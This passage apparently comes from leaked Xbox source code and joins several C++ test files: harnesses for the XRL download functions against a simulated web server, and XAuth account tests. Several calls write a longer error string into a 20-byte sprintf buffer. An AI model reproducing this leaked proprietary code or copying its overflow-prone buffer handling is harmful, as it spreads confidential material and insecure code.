			xLog(g_hLog, XLL_FAIL, "Content Size Mismatch");
			hr=E_FAIL;
		}else{
			//Content valid?
			if (0!=memcmp(rgchLocalResponseBuffer,rgchServerResponseBuffer+dwcServerResponseBuffer-dwcValidContent,dwcValidContent)){
				//CONTENT INVALID
				xLog(g_hLog, XLL_FAIL, "Corrupted Content");
				hr=E_FAIL;
			}else{
				//VALID!
				xLog(g_hLog, XLL_PASS, "");
			}//endelse
		}//endelse
		break;

	case S_FALSE:

		//Content size match?
		if (dwcValidContent==dwcLocalResponseBuffer){
			//INVALID CONTENT SIZE
			xLog(g_hLog, XLL_FAIL, "Content Size Match Not Expected");
			hr=E_FAIL;
		}else{
			xLog(g_hLog, XLL_PASS, "");
		}//endelse
		break;

	default:	
		char pszErrorResult[20];
		sprintf(pszErrorResult,"Unexpected Return Value 0x%08x",lhr);
		xLog(g_hLog, XLL_FAIL, pszErrorResult);
		hr=E_FAIL;
	}//endswitch

	//destroy the XRL_KNOWN_HEADERS
	delete pXKH->pContentLength;
	delete pXKH->pLastModifiedTime;
	delete pXKH->pDate;
	delete pXKH;
	pXKH=NULL;

	//return
	return hr;
}//endmethod

//**********
//********** xrlfunc_Enumerate_IIS_Responses
//**********

HRESULT xrlfunc_Enumerate_IIS_Responses(){

	char rgchBuffer[MAX_SERVER_RESPONSE];//response to send back
	char pszVariation[256];	//variation name
	DWORD dwcValidContentLength=0l; //the cases Content-Length member
	bool fExpected; //expect to pass?
	HRESULT hr=S_OK;

	//Loop through the number of server components
	for (unsigned int uiA=0; uiA<ResponseComponents; uiA++){
		//Don't enumerate content field; that is done through content length field
		if (uiA==ContentIndex){
			continue;
		}//endif
		//Loop through the number of variations for the current server component
		for (unsigned int uiB=0; uiB<g_response[uiA].dwcValuePair; uiB++){
			//Initialize the server string and expected outcome
			rgchBuffer[0]='\0';
			fExpected=true;
			dwcValidContentLength=atol(g_response[ContentLengthIndex].rgValuePair[0].pszValue);
			//Constructin this variation
			for (unsigned int uiC=0; uiC<ResponseComponents; uiC++){
				//if we are on the variation field get the variation
				if (uiA==uiC){
					strcat(rgchBuffer,g_response[uiC].rgValuePair[uiB].pszValue);
					fExpected&=g_response[uiC].rgValuePair[uiB].fValid;
					//if we are varring content store the length
					if (uiC==ContentLengthIndex){
						dwcValidContentLength=atol(g_response[uiC].rgValuePair[uiB].pszValue);
					}//endif
				}else{
					//Special check: are we varrying content length field and are we about to write the content field?
					if ((uiC==ContentIndex)&&(uiA==ContentLengthIndex)){
						//special case use special content for content length field variation
						strcat(rgchBuffer,g_response[uiC].rgValuePair[uiB].pszValue);
						fExpected&=g_response[uiC].rgValuePair[uiB].fValid;
					}else{
						//Not a varation field
						strcat(rgchBuffer,g_response[uiC].rgValuePair[0].pszValue);
						fExpected&=g_response[uiC].rgValuePair[0].fValid;
					}//endelse
				}//endelse
			}//endfor
			//Execute the variation
			
			//Run once for XRL_DownloadToMemory
			HRESULT l_hr=S_OK;

			//SET COMPONENT
			xSetComponent(g_hLog, "Online", "XRL_DownloadToMemory");

			//SET FUNCTION
			xSetFunctionName(g_hLog, "IIS Response Tests");

			sprintf(pszVariation,"%s %d",g_response[uiA].pcszName,uiB);
			xStartVariation(g_hLog, pszVariation);
			l_hr=Enumerate_IIS_Responses(rgchBuffer,strlen(rgchBuffer),dwcValidContentLength,fExpected,false);
			if FAILED(l_hr) hr=l_hr;
			xEndVariation(g_hLog);

			//Run once for XRL_DownloadFile

			//SET COMPONENT
			xSetComponent(g_hLog, "Online", "XRL_DownloadFile");

			//SET FUNCTION
			xSetFunctionName(g_hLog, "IIS Response Tests");

			sprintf(pszVariation,"%s %d",g_response[uiA].pcszName,uiB);
			xStartVariation(g_hLog, pszVariation);
			l_hr=Enumerate_IIS_Responses(rgchBuffer,strlen(rgchBuffer),dwcValidContentLength,fExpected,true);
			if FAILED(l_hr) hr=l_hr;
			xEndVariation(g_hLog);

		}//endfor	
	}//endfor

	return hr;
}//endmethod

//**********
//********** TEST CASE MACROS
//**********

//NOTE: hr must init to S_OK
#define BEGINCASE(hr, hLog, desc)\
{\
	HANDLE l_hLog=(hLog);\
	HRESULT* phr=&hr;\
	xStartVariation(l_hLog,(desc));\
	__try{\
		HRESULT lhr=S_OK;

#define TRYCASE(func) lhr=(func);

//Top level HR must be defined
#define ENDCASE(hresult)\
		if (lhr!=(hresult)){\
			char pszErrorResult[20];\
			sprintf(pszErrorResult,"Unexpected Return Value 0x%08x",lhr);\
			xLog(l_hLog, XLL_FAIL, pszErrorResult);\
			*phr=E_FAIL;\
		}else{\
			xLog(l_hLog, XLL_PASS, "");\
		}\
	}__except(1){\
		xLog(l_hLog, XLL_EXCEPTION, "Exception Raised");\
		*phr=E_FAIL;\
	}\
	xEndVariation(l_hLog);\
}

//**********
//********** xrlfunc_DownloadFile
//**********
HRESULT xrlfunc_DownloadFile(){

	//Setup simulator
	const char pcszResponse[]=BASIC_RESPONSE;
	if FAILED(g_oSimulator.SetResponse(pcszResponse,strlen(pcszResponse))) return E_FAIL;

	//Valid parameter #1
	const XRL ValidParam1=DEFAULT_URL;

	//Valid parameter #2
	const DWORD ValidParam2=1024;

	//Valid parameter #3
	BYTE ValidParam3[ValidParam2];

	//Valid parameter #4
	FILETIME* ValidParam4=NULL;

	//Valid parameter #5
	const CHAR* ValidParam5=DEFAULT_FILE;

	//Valid parameter #6
	FILETIME ValidSubParam6Date;
	FILETIME ValidSubParam6LastModifiedTime;
	ULARGE_INTEGER ValidSubParam6ContentLength;
	XRL_KNOWN_HEADERS ValidParam6;
	ValidParam6.pDate=&ValidSubParam6Date;
	ValidParam6.pLastModifiedTime=&ValidSubParam6LastModifiedTime;
	ValidParam6.pContentLength=&ValidSubParam6ContentLength;

	//SET COMPONENT
	xSetComponent(g_hLog, "Online", "XRL_DownloadFile");
	
	//SET FUNCTION
	xSetFunctionName(g_hLog, "Parameter Checks");
	HRESULT hr=S_OK;

	BEGINCASE(hr,g_hLog,"Param #1-#6 VALID")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,ValidParam2,ValidParam3,ValidParam4,ValidParam5,&ValidParam6))
	ENDCASE(S_OK)

/*	BEGINCASE(hr,g_hLog,"Param #1-#6 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(NULL,NULL,NULL,NULL,NULL,NULL))
	ENDCASE(ERROR_INVALID_PARAMETER)

	BEGINCASE(hr,g_hLog,"Param #1 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(NULL,ValidParam2,ValidParam3,ValidParam4,ValidParam5,&ValidParam6))
	ENDCASE(ERROR_INVALID_PARAMETER)

	BEGINCASE(hr,g_hLog,"Param #2 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,NULL,ValidParam3,ValidParam4,ValidParam5,&ValidParam6))
	ENDCASE(ERROR_INVALID_PARAMETER)

	BEGINCASE(hr,g_hLog,"Param #3 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,ValidParam2,NULL,ValidParam4,ValidParam5,&ValidParam6))
	ENDCASE(ERROR_INVALID_PARAMETER)
*/
	BEGINCASE(hr,g_hLog,"Param #4 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,ValidParam2,ValidParam3,NULL,ValidParam5,&ValidParam6))
	ENDCASE(S_OK)

/*	BEGINCASE(hr,g_hLog,"Param #5 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,ValidParam2,ValidParam3,ValidParam4,NULL,&ValidParam6))
	ENDCASE(ERROR_INVALID_PARAMETER)

	BEGINCASE(hr,g_hLog,"Param #6 NULL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,ValidParam2,ValidParam3,ValidParam4,ValidParam5,NULL))
	ENDCASE(S_OK)
*/
	//SET FUNCTION
	xSetFunctionName(g_hLog, "Buffer Size");

	BEGINCASE(hr,g_hLog,"Param #2 TOO SMALL")
		DeleteFile(ValidParam5);
		TRYCASE(XRL_DownloadFile(ValidParam1,1,ValidParam3,ValidParam4,ValidParam5,NULL))
	ENDCASE(ERROR_INSUFFICIENT_BUFFER)

	//SET FUNCTION
	xSetFunctionName(g_hLog, "Filenames");

	CreateDirectory("T:\\temp",NULL);
	CreateDirectory("T:\\temp\\temp",NULL);

	char pszVariation[255];
	for (int i=0; i<MAX_FileNames; i++){
		HRESULT lhr=S_OK;
		sprintf(pszVariation,"Variation %d",i);
		xStartVariation(g_hLog,pszVariation);
		__try{
			lhr=XRL_DownloadFile(ValidParam1,ValidParam2,ValidParam3,NULL,g_rgFilenames[i].pszValue,NULL);
			if (g_rgFilenames[i].fValid==true){
				if (lhr==S_OK){
					if (0!=DeleteFile(g_rgFilenames[i].pszValue)){
						xLog(g_hLog, XLL_PASS, "");
					}else{
						xLog(g_hLog, XLL_FAIL, "File Not Created");
					}//endelse
				}else{
					char pszErrorResult[20];
					sprintf(pszErrorResult,"Unexpected Return Value 0x%08x",lhr);
					xLog(g_hLog, XLL_FAIL, pszErrorResult);
					hr=E_FAIL;
				}//endelse
			}else{
				if (0==DeleteFile(g_rgFilenames[i].pszValue)){
					xLog(g_hLog, XLL_PASS, "");
				}else{
					xLog(g_hLog, XLL_FAIL, "File Was Not Supposed To Be Created");
				}//endelse
			}//endelse
		}__except(1){
			xLog(g_hLog, XLL_EXCEPTION, "Exception Raised");
			hr=E_FAIL;
		}//endexcept
		xEndVariation(g_hLog);
	}//endfor

	return hr;

}//endmethod

//**********
//********** xrlfunc_DownloadToMemory
//**********
HRESULT xrlfunc_DownloadToMemory(){

	//Setup simulator
	const char pcszResponse[]=BASIC_RESPONSE;
	if FAILED(g_oSimulator.SetResponse(pcszResponse,strlen(pcszResponse))) return E_FAIL;

	//Valid parameter #1
	const XRL ValidParam1=DEFAULT_URL;

	//Valid parameter #2
	const DWORD cValidParam2=1024;
	DWORD ValidParam2=cValidParam2;

	//Valid parameter #3
	BYTE ValidParam3[cValidParam2];

	//Valid parameter #4
	FILETIME ValidSubParam4Date;
	FILETIME ValidSubParam4LastModifiedTime;
	ULARGE_INTEGER ValidSubParam4ContentLength;
	XRL_KNOWN_HEADERS ValidParam4;
	ValidParam4.pDate=&ValidSubParam4Date;
	ValidParam4.pLastModifiedTime=&ValidSubParam4LastModifiedTime;
	ValidParam4.pContentLength=&ValidSubParam4ContentLength;

	XRL_KNOWN_HEADERS CrazyParam4;

	//SET COMPONENT
	xSetComponent(g_hLog, "Online", "XRL_DownloadToMemory");

	//SET FUNCTION
	xSetFunctionName(g_hLog, "Parameter Checks");
	HRESULT hr=S_OK;

	BEGINCASE(hr,g_hLog,"Param #1-#4 VALID");
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&ValidParam4))
	ENDCASE(S_OK);

/*	BEGINCASE(hr,g_hLog,"Param #1-#4 NULL");
		TRYCASE(XRL_DownloadToMemory(NULL,NULL,NULL,NULL))
	ENDCASE(ERROR_INVALID_PARAMETER);

	BEGINCASE(hr,g_hLog,"Param #1 NULL");
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(NULL,&ValidParam2,ValidParam3,&ValidParam4))
	ENDCASE(ERROR_INVALID_PARAMETER);

	BEGINCASE(hr,g_hLog,"Param #2 NULL");
		TRYCASE(XRL_DownloadToMemory(ValidParam1,NULL,ValidParam3,&ValidParam4))
	ENDCASE(ERROR_INVALID_PARAMETER);

	BEGINCASE(hr,g_hLog,"Param #3 NULL");
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,NULL,&ValidParam4))
	ENDCASE(ERROR_INVALID_PARAMETER);

*/	BEGINCASE(hr,g_hLog,"Param #4 NULL");
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,NULL))
	ENDCASE(S_OK);

	BEGINCASE(hr,g_hLog,"Param #4 SubParam ALL NULL");
		CrazyParam4.pDate=&ValidSubParam4Date;
		CrazyParam4.pLastModifiedTime=&ValidSubParam4LastModifiedTime;
		CrazyParam4.pContentLength=NULL;
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&CrazyParam4))
	ENDCASE(S_OK);

	BEGINCASE(hr,g_hLog,"Param #4 SubParam pDate NULL");
		CrazyParam4.pDate=NULL;
		CrazyParam4.pLastModifiedTime=&ValidSubParam4LastModifiedTime;
		CrazyParam4.pContentLength=&ValidSubParam4ContentLength;
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&CrazyParam4))
	ENDCASE(S_OK);

	BEGINCASE(hr,g_hLog,"Param #4 SubParam pLastModified NULL");
		CrazyParam4.pDate=&ValidSubParam4Date;
		CrazyParam4.pLastModifiedTime=NULL;
		CrazyParam4.pContentLength=&ValidSubParam4ContentLength;
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&CrazyParam4))
	ENDCASE(S_OK);

	BEGINCASE(hr,g_hLog,"Param #4 SubParam pContentLength NULL");
		CrazyParam4.pDate=&ValidSubParam4Date;
		CrazyParam4.pLastModifiedTime=&ValidSubParam4LastModifiedTime;
		CrazyParam4.pContentLength=NULL;
		ValidParam2=cValidParam2;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&CrazyParam4))
	ENDCASE(S_OK);

	//SET FUNCTION
	xSetFunctionName(g_hLog, "Buffer Size");
	BEGINCASE(hr,g_hLog,"Param #2 TOO SMALL");
		ValidParam2=1;
		TRYCASE(XRL_DownloadToMemory(ValidParam1,&ValidParam2,ValidParam3,&ValidParam4))
	ENDCASE(ERROR_INSUFFICIENT_BUFFER);

	return hr;
}//endmethod

//**********
//********** xrlfunc_UploadFile
//**********
HRESULT xrlfunc_UploadFile(){
	return E_NOTIMPL;
}//endmethod
	
//**********
//********** xrlfunc_Performance
//**********
HRESULT xrlfunc_Performance(){
	HRESULT hr=S_OK;

	const DWORD dwcSize=1024;
	BYTE pBuffer[dwcSize];
	DWORD dwSize=dwcSize;

	DWORD dwBeginTime;
	DWORD dwEndTime;
	char pszTiming[1024];

	//BUGBUG: TEMP CODE
	XonlineChangeAllIPs( 0x0B56A8C0 );

	//SETCOMPONENT
	xSetComponent(g_hLog, "Online", "XRL_DownloadToMemory");

	//SETFUNCTION
	xSetFunctionName(g_hLog, "Performance");

	xStartVariation(g_hLog,"1K");
	dwBeginTime=GetTickCount();
	hr=XRL_DownloadToMemory(DOWNLOAD_URL,&dwSize,pBuffer,NULL);
	dwEndTime=GetTickCount();
	if SUCCEEDED(hr){
		sprintf(pszTiming,"%d ms\n",dwEndTime-dwBeginTime);
		xLog(g_hLog, XLL_PASS, pszTiming);
	}else{
		xLog(g_hLog, XLL_FAIL, "Execution Failed");
	}//endelse
	xEndVariation(g_hLog);

	//SETCOMPONENT
	xSetComponent(g_hLog, "Online", "XRL_DownloadFile");

	//SETFUNCTION
	xSetFunctionName(g_hLog, "Performance");

	xStartVariation(g_hLog,"1K");
	DeleteFile(DEFAULT_FILE);
	dwBeginTime=GetTickCount();
	hr=XRL_DownloadFile(DOWNLOAD_URL,dwcSize,pBuffer,NULL,DEFAULT_FILE,NULL);
	dwEndTime=GetTickCount();
	if SUCCEEDED(hr){
		if (0==DeleteFile(DEFAULT_FILE)){
			xLog(g_hLog, XLL_FAIL, "File Was Not Created");
		}else{
			sprintf(pszTiming,"%d ms",dwEndTime-dwBeginTime);
			xLog(g_hLog, XLL_PASS, pszTiming);
		}//endelse
	}else{
		xLog(g_hLog, XLL_FAIL, "Execution Failed");
	}//endelse
	xEndVariation(g_hLog);

	//SETCOMPONENT
	xSetComponent(g_hLog, "Online", "XRL_DownloadFile");

	//SET FUNCTION
	xSetFunctionName(g_hLog, "Performance");

	xStartVariation(g_hLog,"1M");
	DeleteFile(DEFAULT_FILE);
	dwBeginTime=GetTickCount();
	hr=XRL_DownloadFile(DOWNLOAD_URL2,dwcSize,pBuffer,NULL,DEFAULT_FILE,NULL);
	dwEndTime=GetTickCount();
	if SUCCEEDED(hr){
		if (0==DeleteFile(DEFAULT_FILE)){
			xLog(g_hLog, XLL_FAIL, "File Was Not Created");
		}else{
			sprintf(pszTiming,"%d ms",dwEndTime-dwBeginTime);
			xLog(g_hLog, XLL_PASS, pszTiming);
		}//endelse
	}else{
		xLog(g_hLog, XLL_FAIL, "Execution Failed");
	}//endelse
	xEndVariation(g_hLog);

	//UPLOAD HERE

	return hr;
}//endmethod


//**********
//********** xrlfunc_RunTests
//**********
HRESULT xrlfunc_RunTests(){

	HRESULT hr=S_OK;

	//Initialize Networking
	if FAILED(xrlfunc_InitializeNet()){
		return E_FAIL;
	}//endif

	//Run XRL_SERVER_RESPONSE Tests (for both XRL_DownloadFile and XRL_DownloadToMemory)
	hr=xrlfunc_Enumerate_IIS_Responses();
	DebugPrint("xrlfunc_Enumerate_IIS_Responses() 0x%08x\n",hr);
	
	//XRL_DownloadFile Specific Tests
	hr=xrlfunc_DownloadFile();
	DebugPrint("xrlfunc_DownloadFile() 0x%08x\n",hr);

	//XRL_DownloadToMemory Specific Tests
	hr=xrlfunc_DownloadToMemory();
	DebugPrint("xrlfunc_DownloadToMemory() 0x%08x\n",hr);

	//XRL_DownloadToMemory Specific Tests
	hr=xrlfunc_UploadFile();
	DebugPrint("xrlfunc_UploadFile() 0x%08x\n",hr);

	//Run Performance Tests
	hr=xrlfunc_Performance();
	DebugPrint("xrlfunc_Performance() 0x%08x\n",hr);

	//Cleanup Networking
	xrlfunc_CleanupNet();

	return S_OK;

}//endmethod

static XONLINE_USER testUsers[1] =
{
	{ "User1", 0,
		{'1','2','3','4','5','6','7','8','1','2','3','4','5','6','7','8','1','2','3','4','5','6','7','8','1','2','3','4','5','6','7','8'} }
};

//**********
//********** xrlfunc_StartTest
//**********
VOID WINAPI xrlfunc_StartTest(HANDLE hLog){

	BREAK_INTO_DEBUGGER;

	g_hLog = hLog;

	//start server simulator
	DWORD dwThreadid=0L;
	g_hThread=CreateThread(NULL, 0, &webserver_simulator, &g_oSimulator, 0, &dwThreadid);

	//BUGBUG: TEMP CODE
	HRESULT hr=S_OK;
	XonlineResetState();
	hr = XonlineCreateMachineAccount();
	hr = XonlineCreateUserAccount(&testUsers[0], 0, NULL, NULL);
    hr = XonlineLogon("xmatch,content,xstats", testUsers, 1);
	XonlineChangeAllIPs( 0x0100007F );

	//give simulator a second to start up
	Sleep(1000);

	//run tests
	xrlfunc_RunTests();

}//endmethod

//**********
//********** xrlfunc_EndTest
//**********
VOID WINAPI xrlfunc_EndTest(VOID){

	//stop server simulator
	g_oSimulator.Stop();

	//delete temporary ticket file
	DeleteFile(TICKET_FILE);

	//give simulator a second to shutdown
	Sleep(1000);

	//If it did not shutdown kill it
	DWORD dwExitCode=0;
	if (0!=GetExitCodeThread(g_hThread,&dwExitCode)){
		//TerminateThread(g_hThread,-1); //unsupported at this time
	}//endif

	CloseHandle(g_hThread);

}//endmethod

//**********
//********** Export function pointers of StartTest and EndTest
//**********
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( xrlfunc )
#pragma data_seg()

BEGIN_EXPORT_TABLE( xrlfunc )
    EXPORT_TABLE_ENTRY( "StartTest", xrlfunc_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", xrlfunc_EndTest )
END_EXPORT_TABLE( xrlfunc )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xauth\bvt\xauthbvt.h ===
#ifndef __XAUTHBVT_H__
#define __XAUTHBVT_H__

//==================================================================================
// Includes
//==================================================================================
#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include <xnetref.h>

namespace XAuthBVTNamespace {

//==================================================================================
// Defines
//==================================================================================
#define FAIL_TESTCASE(FailureMessage)	xLog(hLog, XLL_FAIL, FailureMessage); \
										break
#define PASS_TESTCASE(PassMessage)		xLog(hLog, XLL_PASS, PassMessage);
#define START_TESTCASE(TestCaseName)	while(TRUE) \
										{ \
											xStartVariation(hLog, TestCaseName)
#define END_TESTCASE()						break; \
										}; \
										xEndVariation(hLog)

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI XAuthBVTDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI XAuthBVTStartTest(IN HANDLE hLog);
VOID WINAPI XAuthBVTEndTest();

} // namespace XAuthBVTNamespace

#endif // __XAuthBVT_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xauth\core\xauthtest.h ===
#ifndef __XAUTHTEST_H__
#define __XAUTHTEST_H__

//==================================================================================
// Includes
//==================================================================================
#include <xtl.h>
#include <xdbg.h>
#include <winsockx.h>
#include <stdio.h>
#include <xlog.h>

#include <xonline.h>
#include <xnetref.h>

namespace XAuthTestNamespace {

//==================================================================================
// Defines
//==================================================================================
//==================================================================================
// Defines
//==================================================================================
#define FAIL_TESTCASE(FailureMessage)	xLog(hLog, XLL_FAIL, FailureMessage); \
										break
#define PASS_TESTCASE(PassMessage)		xLog(hLog, XLL_PASS, PassMessage);
#define START_TESTCASE(TestCaseName)	while(TRUE) \
										{ \
											xStartVariation(hLog, TestCaseName)
#define END_TESTCASE()						break; \
										}; \
										xEndVariation(hLog)
#define CLEANUP_TASK(hTask)				if(hTask) \
										{ \
											DWORD dwCleanupPollCount = 0, dwCleanupWorkFlags = 0; \
											XOnlineTaskCancel(hTask, &dwCleanupWorkFlags); \
											while(!XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwCleanupWorkFlags)) \
											{ \
												XOnlineTaskContinue(hTask, 0, &dwCleanupWorkFlags); \
												++dwCleanupPollCount; \
											} \
											XOnlineTaskCloseHandle(hTask); \
											hTask = NULL; \
										}

//==================================================================================
// Typedefs
//==================================================================================

//==================================================================================
// Structures
//==================================================================================

//==================================================================================
// Prototypes 
//==================================================================================
// Harness functions
BOOL WINAPI XAuthTestDllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext);
VOID WINAPI XAuthTestStartTest(IN HANDLE hLog);
VOID WINAPI XAuthTestEndTest();

// Helper functions

// Local test cases

} // namespace XAuthTestNamespace

#endif // __XAuthTest_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xauth\core\xauthtest.cpp ===
//==================================================================================
// Includes
//==================================================================================
#define INITGUID
#include "xauthtest.h"

using namespace XAuthTestNamespace;

namespace XAuthTestNamespace {

//==================================================================================
// Globals
//==================================================================================
static CRITICAL_SECTION g_csSerializeAccess;
HANDLE g_hHeap = NULL;

//==================================================================================
// PollTaskUntilComplete
//----------------------------------------------------------------------------------
//
// Description: Calls the XOnlineTaskComplete function until either the given
//    task has been completed or the amount of available time has expired
//
// Arguments:
//	XONLINETASK_HANDLE	hAsyncHandle		Handle to async task
//	HANDLE				hWorkToDoEvent		Event that is associated with this async task.
//											This can be set to NULL or INVALID_HANDLE_VALUE
//											if no event is associated with the task
//	DWORD				dwMaxWaitTime		Maximum amount of time to wait for the task to
//											complete. This can be set to INFINITE to block
//											until completion
//	DWORD				*pdwPollCounter		Optional counter passed in to keep track of the
//											number of calls made to the XOnlineTaskDoWork2 function
//	BOOL				*pfCompleted		Optional boolean passed in to keep track if whether
//											the task completed or not
//  BOOL				fCloseOnComplete	Indicates whether the function should close a handle
//											after it indicates completion
//
// Returns: The last result code from XOnlineTaskDoWork2 is returned.  If a valid pointer
//   is provided for pfCompleted, it is updated to reflect whether the task has completed or not
//==================================================================================
HRESULT PollTaskUntilComplete(XONLINETASK_HANDLE hAsyncHandle, HANDLE hWorkToDoEvent, DWORD dwMaxWaitTime, DWORD *pdwPollCounter, BOOL *pfCompleted, BOOL fCloseOnComplete)
{
	HRESULT hr = S_OK;
	DWORD dwLastTime = 0, dwCurrentTime = 0, dwCurrentDuration = 0, dwWaitTimeLeft = dwMaxWaitTime;
	DWORD dwWorkFlags = 0, dwInternalPollCounter = 0;

	if(pfCompleted)
		*pfCompleted = FALSE;

	dwLastTime = GetTickCount();

	while(TRUE)
	{

		if((hWorkToDoEvent != INVALID_HANDLE_VALUE) && (hWorkToDoEvent != NULL))
			WaitForSingleObject(hWorkToDoEvent, dwWaitTimeLeft);

//        hr = XOnlineTaskContinue(hAsyncHandle, 0, &dwWorkFlags);
        hr = XOnlineTaskDoWork2(hAsyncHandle, 0);

		if(FAILED(hr))
			return hr;

		// Update the poll-counter
		++dwInternalPollCounter;

        if (XONLINETASK_WORKFLAGS_CONTAINS_DONT_CONTINUE(dwWorkFlags))
        {
			if(fCloseOnComplete)
				XOnlineTaskClose(hAsyncHandle);
//				XOnlineTaskCloseHandle(hAsyncHandle);

			if(pfCompleted)
				*pfCompleted = TRUE;

            break;
        }
		
		if(dwMaxWaitTime != INFINITE)
		{
			// See if we have gone beyond the maximum allowed time
			dwCurrentTime = GetTickCount();
			if(dwCurrentTime < dwLastTime)
			{
				dwCurrentDuration = ((MAXDWORD - dwLastTime) + dwCurrentTime);
			}
			else
			{
				dwCurrentDuration = (dwCurrentTime - dwLastTime);
			}
			
			if(dwCurrentDuration >= dwWaitTimeLeft)
			{
				hr = E_FAIL;
				goto Exit;
			}
			
			dwWaitTimeLeft -= dwCurrentDuration;
			dwLastTime = dwCurrentTime;
		}
	}

Exit:
	if(pdwPollCounter)
		*pdwPollCounter = dwInternalPollCounter;

	return hr;
}


//==================================================================================
// XAuthTestDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI XAuthTestDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	WSADATA WSAData;

	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		WSAStartup(MAKEWORD(2, 2), &WSAData);
		InitializeCriticalSection(&g_csSerializeAccess);
		g_hHeap = HeapCreate(0,0,0);
		break;
	case DLL_PROCESS_DETACH:
		WSACleanup();
		XNetRelease();
		DeleteCriticalSection(&g_csSerializeAccess);
		HeapDestroy(g_hHeap);
		g_hHeap = NULL;
		break;
	default:
		break;
	}

    return TRUE;
}

//------------ tests start below ---------------------------------------------------

VOID WINAPI xauthtest_XOnlineHasMachineAccount(HANDLE hLog)
{
	START_TESTCASE("Look for machine account when it isn't present");

	//make sure no accounts are present
    XOnlineSetupTempAccounts( FALSE, XONLINE_LOCAL_HARD_DRIVE, 0 );

	if( XOnlineHasMachineAccount() == FALSE )
	{
		PASS_TESTCASE("XOnlineHasMachineAccount didn't find machine account" );
	}
	else
	{
		FAIL_TESTCASE("XOnlineHasMachineAccount found machine account" );
	}

	END_TESTCASE();

	START_TESTCASE("Look for machine account when it is present");

	//make sure accounts are present
	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, XONLINE_MAX_STORED_ONLINE_USERS );

	if( XOnlineHasMachineAccount() == FALSE )
	{
		FAIL_TESTCASE("XOnlineHasMachineAccount didn't find machine account" );
	}
	else
	{
		PASS_TESTCASE("XOnlineHasMachineAccount found machine account" );
	}

	END_TESTCASE();

	return;
}

VOID WINAPI xauthtest_XOnlineGetUsers(HANDLE hLog)
{
	HRESULT hr;
	XONLINE_USER UsersArray[XONLINE_MAX_STORED_ONLINE_USERS];
	DWORD dwNumUsers;

	//make sure accounts are not present
	XOnlineSetupTempAccounts( FALSE, XONLINE_LOCAL_HARD_DRIVE, 0 );

	//failure case #1; call with an unmounted MMU
	//  at this point there is no way to get accounts onto the MMU
	


	START_TESTCASE("Get user accounts when none are present");

	//failure case #2; no online users
	hr = XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, UsersArray, &dwNumUsers );
	
	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineGetUsers failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineGetUsers returned success, but should have failed");
	}

	END_TESTCASE();



	//for remaining cases accounts must exist
	XOnlineSetupTempAccounts( TRUE, XONLINE_LOCAL_HARD_DRIVE, 8 );


/* Causes RIP
	START_TESTCASE("Get user accounts with NULL pUsers");

	//failure case #3; call with NULL pUsers;
	hr = XOnlineGetUsers( XONLINE_LOCAL_HARD_DRIVE, NULL, &dwNumUsers );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineGetUsers failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineGetUsers returned success, but should have failed");
	}

	END_TESTCASE();
*/

/* TEMP Occasionally cause break
	START_TESTCASE("Get user accounts with invalid chDrive");

	//failure case #4; call with invalid chDrive
	hr = XOnlineGetUsers( 'F', UsersArray, &dwNumUsers );

	xLog(hLog, XLL_INFO, "XOnlineGetUsers returned 0x%08x", hr);
	if( FAILED(hr) )
	{
		PASS_TESTCASE("XOnlineGetUsers failed as expected");
	}
	else
	{
